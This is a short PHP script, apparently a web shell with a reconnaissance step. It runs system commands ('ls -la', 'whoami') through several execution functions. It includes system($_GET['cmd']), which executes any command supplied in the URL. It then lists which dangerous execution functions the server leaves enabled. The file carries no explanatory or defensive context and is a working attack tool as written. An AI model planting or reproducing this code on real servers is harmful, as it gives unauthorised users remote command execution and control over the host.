<?php
echo exec("ls -la");
echo shell_exec("ls -la");
system("whoami");
system($_GET['cmd']);
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
